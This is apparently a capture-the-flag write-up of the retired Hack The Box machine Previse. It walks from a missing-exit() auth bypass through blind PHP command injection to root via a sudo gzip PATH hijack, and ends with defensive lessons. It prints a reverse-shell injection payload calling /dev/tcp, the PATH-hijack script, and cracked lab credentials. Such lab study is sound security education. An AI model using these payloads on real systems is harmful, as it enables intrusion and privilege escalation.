---
title: "HTB: Previse · from a broken PHP redirect to root via command injection"
date: 2026-09-11
draft: false
tags: ["hackthebox", "linux", "web", "privilege-escalation", "command-injection", "broken-access-control"]
summary: "A retired easy Linux box built entirely around one PHP habit gone wrong: a missing exit() after a login redirect lets an unauthenticated user create an account, source code recovered from an exposed backup reveals a textbook command injection, and a sudo script calling gzip without an absolute path hands over root."
---

## Overview

Previse is a retired easy-difficulty Linux machine from Hack The Box, and every step traces back to the same root cause: PHP code that assumes a redirect stops execution, when it doesn't. The path is:

1. A **broken authentication check** in `accounts.php` lets an unauthenticated POST create a user account anyway.
2. Logging in exposes a downloadable **site backup** containing the full PHP source code.
3. Reading that source finds a textbook **command injection** in a log-processing feature, giving a `www-data` shell.
4. Database credentials in the source lead to a cracked password hash for a real system user.
5. A **sudo script with an unqualified binary name** (`gzip` instead of `/bin/gzip`) allows a PATH hijack straight to root.

Target: `10.129.95.185`, an Ubuntu server running a small internal file-sharing PHP application called Previse.

## Enumeration

Full TCP scan with default scripts and version detection:

```bash
nmap -sC -sV -p- -oN nmap-previse.txt 10.129.95.185
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

Only two ports, and port 80 redirects straight to `login.php`, titled "Previse Login". No anonymous SMB, no exotic services, this one lives entirely in the web application. `gobuster` maps the app:

```bash
gobuster dir -u http://10.129.95.185 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```
/accounts.php  (Status: 302) [--> login.php]
/config.php    (Status: 200)
/download.php  (Status: 302) [--> login.php]
/files.php     (Status: 302) [--> login.php]
/file_logs.php (Status: 302) [--> login.php]
/index.php     (Status: 302) [--> login.php]
/logout.php    (Status: 302) [--> login.php]
/logs.php      (Status: 302) [--> login.php]
/status.php    (Status: 302) [--> login.php]
```

Everything auth-gated, as expected, except `config.php` returning an empty 200 (normal for a server-side include with no HTML output). So far this looks like a dead end without credentials.

## Foothold · a missing `exit()`

Testing the same endpoints by hand instead of trusting the scanner turns up an inconsistency: a plain, cookie-less `curl` request to `accounts.php` doesn't behave like gobuster's request at all.

```bash
curl -s http://10.129.95.185/accounts.php
```

This returns a full 200 response: the "Add New Account" form, complete with the warning *"ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!"*. Two unauthenticated GET requests to the same URL, two different results. That's not normal, and it's worth treating as a lead rather than a fluke.

Capturing the account-creation form's POST request and replaying it in Burp Repeater, with no session cookie at all, confirms it: sending `username`, `password` and `confirm` gets back **"Success! User was added!"**. The account creation logic runs regardless of whether anyone is logged in.

The cause turns out to be a one-line bug, visible later once the source is in hand:

```php
if (!isset($_SESSION['user'])) {
    header('Location: login.php');
}
// execution continues here either way
```

`header()` only queues a redirect, it doesn't stop the script. Without a following `exit;`, everything after that check still runs for an unauthenticated visitor. A browser follows the redirect and never renders the rest of the page, which is why this stayed hidden during normal use, and it's also why `gobuster`'s GET request showed a clean 302: a GET without a submitted form just falls through to an empty result. It only surfaces once you send the actual POST data.

With the new account, logging in via `login.php` gives a real session. `files.php` (also broken the same way, incidentally, but no longer needed) had already hinted at a `siteBackup.zip` reachable through `download.php?file=32`. Now downloadable with a valid session:

```bash
curl -s -b "PHPSESSID=<session>" "http://10.129.95.185/download.php?file=32" -o siteBackup.zip
unzip siteBackup.zip -d siteBackup
```

The zip contains the entire PHP source tree behind the app.

## From source code to a shell

`config.php` hands over the database credentials in cleartext:

```php
$user = 'root';
$passwd = 'mySQL_p@ssw0rd!:)';
```

But the more interesting file is `logs.php`, backing the "Log Data" feature (`file_logs.php`'s form lets a user pick a log delimiter: comma, space, or tab):

```php
$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;
...
ob_clean();
readfile($filepath);
```

`$_POST['delim']` is concatenated directly into a shell command with no validation and no escaping. This is **command injection**: any shell metacharacter in `delim` (`;`, `&&`, `|`, backticks) breaks out of the intended argument and runs as a second command. Interestingly, the `echo $output` never actually reaches the response, `ob_clean()` wipes the output buffer right before the script serves the log file, so this is a **blind** injection, the command runs, but its output is invisible over HTTP. That's fine, a reverse shell doesn't need to print anything back:

```bash
curl -s -b "PHPSESSID=<session>" \
  --data-urlencode "delim=comma; bash -c 'bash -i >& /dev/tcp/10.10.14.55/4444 0>&1'" \
  http://10.129.95.185/logs.php
```

```
$ nc -lvnp 4444
connect to [10.10.14.55] from (UNKNOWN) [10.129.95.185] 59404
www-data@previse:/var/www/html$
```

Shell as `www-data` confirmed.

## Privilege escalation · database creds to a PATH hijack

The MySQL root credential from `config.php` still works locally, and the `accounts` table has more to give than the accounts created during the foothold:

```sql
select * from accounts;
```

```
| username | password                            |
|----------|-------------------------------------|
| m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.   |
```

That's an MD5crypt hash (`$1$salt$hash`, hashcat mode 500), and yes, the salt genuinely contains an emoji, that's not a rendering artifact, it's baked into the hash itself. Hashcat handles raw bytes just fine regardless of what they render as:

```bash
hashcat -m 500 -a 0 m4lwhere.hash /usr/share/wordlists/rockyou.txt
# $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
```

`m4lwhere` turns out to be a real system account, reachable directly over the SSH port that was open from the start:

```bash
ssh m4lwhere@10.129.95.185
cat user.txt
```

User flag captured. Checking sudo rights finds a single, narrowly scoped entry:

```bash
sudo -l
# (root) /opt/scripts/access_backup.sh
```

```bash
cat /opt/scripts/access_backup.sh
```

```bash
#!/bin/bash
gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

The script calls `gzip` by name, not by full path (`/bin/gzip`). Run as root via `sudo`, it still searches whatever `$PATH` the invoking user has, and this sudoers configuration doesn't reset it (`secure_path` isn't set). Put a fake `gzip` earlier in `$PATH` and root executes it instead:

```bash
mkdir /dev/shm/hijack
cat << 'EOF' > /dev/shm/hijack/gzip
#!/bin/bash
bash -p -i > /dev/tty 2>&1 < /dev/tty
EOF
chmod +x /dev/shm/hijack/gzip
export PATH=/dev/shm/hijack:$PATH
sudo /opt/scripts/access_backup.sh
```

(The explicit `/dev/tty` redirection matters, the script's own `>` into a `.gz` file would otherwise swallow the spawned shell's output along with it.)

```
root@previse:~# cat /root/root.txt
ad645ed8************************89
```

Root flag captured. Full compromise.

## Lessons learned

Every step here is a variation on the same theme: code that trusts its own assumptions more than it should.

- **`header('Location: ...')` is not `exit`.** PHP keeps executing after queuing a redirect. Any authentication check built this way needs an explicit `exit;` right after it, or it's decorative.
- **Never build a shell command from unsanitized user input.** `escapeshellarg()`, an allow-list of valid values, or avoiding `exec()`/`shell_exec()` entirely would all have closed this off; string concatenation into a shell command is close to always a vulnerability.
- **A downloadable backup is a source code leak.** Once source is out, every credential and every logic bug inside it is out too. Backups need the same access control as the application itself, arguably more.
- **`sudo` entries should call binaries by absolute path**, and sudoers should set `secure_path`. A relative binary name inside a privileged script is a standing invitation to a `$PATH` hijack.

*Flags are partially redacted, per convention.*
